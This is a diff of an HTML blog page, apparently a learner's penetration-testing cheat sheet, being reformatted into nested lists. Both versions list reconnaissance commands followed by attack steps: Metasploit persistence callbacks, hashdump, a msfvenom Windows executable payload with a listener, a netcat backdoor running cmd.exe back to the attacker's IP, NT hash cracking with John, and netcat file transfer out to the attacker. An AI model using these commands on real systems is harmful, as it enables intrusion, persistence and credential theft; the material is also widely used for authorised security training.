@@ -271,59 +271,87 @@ Here is a formatted list of basic commands. I used these as I was learning how t
 <h2>Reconnaissance</h2>
 <ul>
 <li><code>nslookup &lt;domain&gt; </code></li>
-	Discover target’s IP/FQDN domain
+	<ul>
+		<li>Discover target’s IP/FQDN domain</li>
+	</ul>
 <li><code>nslookup &lt;ip&gt; </code></li>
 <li><code>root@kl~# dig &lt;domain&gt;  </code></li>
-	Find nameserver for known domain
+	<ul>
+		<li>Find nameserver for known domain</li>
+	</ul>
 <li><code>root@kl~# dig axfr @&lt;name server&gt; &lt;domain&gt; </code></li>
-	perform a zone transfer to list hosts w/in domain
+	<ul>
+		<li>perform a zone transfer to list hosts w/in domain</li>
+	</ul>
 <li><code>root@kl~# traceroute &lt;ip&gt; </code></li>
-		determine route to a host
+	<ul>
+		<li>determine route to a host</li>
+	</ul>
 <li><code>C:\> tracert &lt;ip&gt; </code></li>
-		determine route to a host
+	<ul>
+		<li>determine route to a host</li>
+	</ul>
 <li><code>root@kl~# nmap –sV –O &lt;ip&gt; </code></li>
-	scan for services and operating system
+	<ul>
+		<li>scan for services and operating system</li>
+	</ul>
 <li><code>root@kl~# nmap --script=vulns &lt;ip&gt; </code></li>
-	scan for some old vulns
+	<ul>
+		<li>scan for some old vulns</li>
+	</ul>
 	
 <h2>Gain and Maintain</h2>
-establish ssh connection
-	root@kl~# ssh <user>@<ip>
-remote desktop (rdesktop is port 3389 and vncviewer is 5900)
-	rdesktop -u <username> -p <password> <ip>
-	vncviewer <ip>
-favorites from the msf console
-	search <keyword>
-	info <module> 
-	use <module>
-	show options (shows you what to fill in)
-	show payloads (shows payloads associated with the exploit you loaded)
-	background (use to background sessions)
-	pwd vs lpwd & cd vs lcd
-	sessions –i <#>  (to interact with sessions)
-	run persistence –h 
-	run persistence –A –r <your ip> -p <port> -i 10 (call back every 10 seconds if connection is lost)
-	hashdump
-add a route in msf
-	route add <victim subnet> <subnet mask> <session#>
-	route print
-make a msfvenom payload for windows executable
-	root@kl~# msfvenom –p <payload> lhost=<ip> lport=<port> -f exe –i 2 > <file>.exe
-	root@kl~# msfvenom –l encoders (for list of encoders)
-	set up a listener in metasploit
-		use exploit/multi/handler
-		set payload
-		set ExitOnSession false
-		exploit –j (run as a job)
-netcat backdoor
-	root@kl~# nc –l –p <port> (on launch platform)
-	C:\> start nc <launch ip> <port> -e cmd.exe
-Escalate and Propagate
-get passwords using meterpreter or shell (/etc/shadow or hashdump)
-use john to crack NT hashes – remember to add special words you find to the password list in john
-	root@kl~# ./john <file> --format=nt
-transfer files with netcat
-	root@kl~#  nc –l –p <port> > <file> (on your platform to listen for file)
-	C:\> nc.exe <your ip> <port>  <  <file to transfer>
-transfer files with python
-	python –m SimpleHTTPServer <port>
+<li><code>root@kl~# ssh &lt;user&gt;@&lt;ip&gt; </code></li>
+	<ul>
+		<li>establish ssh connection</li>
+	</ul>
+<li><code>rdesktop -u &lt;username&gt; -p &lt;password&gt; &lt;ip&gt; </code></li>
+<li><code>vncviewer &lt;ip&gt; </code></li>
+	<ul>
+		<li>remote desktop (rdesktop is port 3389 and vncviewer is 5900)</li>
+	</ul>
+<li>favorites from the msf console</li>
+	<ul>
+		<li><code>search &lt;keyword&gt;</code></li>
+		<li><code>info &lt;module&gt; </code></li>
+		<li><code>use &lt;module&gt;</code></li>
+		<li><code>show options </code>(shows you what to fill in)</li>
+		<li><code>show payloads </code>(shows payloads associated with the exploit you loaded)</li>
+		<li><code>background </code>(use to background sessions)</li>
+		<li><code>pwd vs lpwd & cd vs lcd </code></li>
+		<li><code>sessions –i &lt;#&gt; </code> (to interact with sessions)</li>
+		<li><code>run persistence –h </code></li>
+		<li><code>run persistence –A –r &lt;your ip&gt; -p &lt;port&gt; -i 10 </code>(call back every 10 seconds if connection is lost)</li>
+		<li><code>hashdump </code></li>
+	</ul>
+<li>add a route in msf</li>
+	<ul>
+		<li><code>route add &lt;victim subnet&gt; &lt;subnet mask&gt; &lt;session#&gt; </code></li>
+		<li><code>route print</code></li>
+	</ul>
+<li>make a msfvenom payload for windows executable</li>
+	<ul>
+		<li><code>root@kl~# msfvenom –p &lt;payload&gt; lhost=&lt;ip&gt; lport=&lt;port&gt; -f exe –i 2 &gt; &lt;file&gt;.exe </code></li>
+		<li><code>root@kl~# msfvenom –l encoders (for list of encoders)
+	</ul>
+<li>set up a listener in metasploit</li>
+		<li><code>use exploit/multi/handler</code></li>
+		<li><code>set payload</code></li>
+		<li><code>set ExitOnSession false</code></li>
+		<li><code>exploit –j (run as a job)</code></li>
+<li>netcat backdoor</li>
+	<li><code>root@kl~# nc –l –p &lt;port&gt; (on launch platform)</code></li>
+	<li><code>C:\> start nc &lt;launch ip&gt; &lt;port&gt; -e cmd.exe</code></li>
+</ul>			
+			
+<h2>Escalate and Propagate</h2>
+<ul>
+	<li>get passwords using meterpreter or shell (/etc/shadow or hashdump)</li>
+	<li> use john to crack NT hashes – remember to add special words you find to the password list in john </li>
+	<li><code>root@kl~# ./john &lt;file&gt; --format=nt </code></li>
+<li>transfer files with netcat </li>
+	<li><code>root@kl~#  nc –l –p &lt;port&gt; > &lt;file&gt; </code>(on your platform to listen for file)</li>
+	<li><code>C:\> nc.exe &lt;your ip&gt; &lt;port&gt;  <  &lt;file to transfer&gt; </code></li>
+<li>transfer files with python</li>
+	<li><code>python –m SimpleHTTPServer <port> </code></li>
+</ul>
